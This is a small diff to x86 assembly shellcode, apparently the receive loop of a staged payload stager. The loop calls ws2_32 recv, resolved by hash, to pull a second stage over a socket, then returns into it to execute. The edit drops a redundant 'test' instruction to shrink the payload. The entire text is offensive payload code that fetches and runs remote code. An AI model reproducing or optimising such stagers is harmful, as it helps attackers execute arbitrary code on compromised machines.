@@ -38,7 +38,6 @@ read_more:               ;
   push 0x5FC8D902        ; hash( "ws2_32.dll", "recv" )
   call ebp               ; recv( s, buffer, length, 0 );
   add ebx, eax           ; buffer += bytes_received
-  sub esi, eax           ; length -= bytes_received
-  test esi, esi          ; test length
+  sub esi, eax           ; length -= bytes_received, will set flags
   jnz read_more          ; continue if we have more to read
   ret                    ; return into the second stage
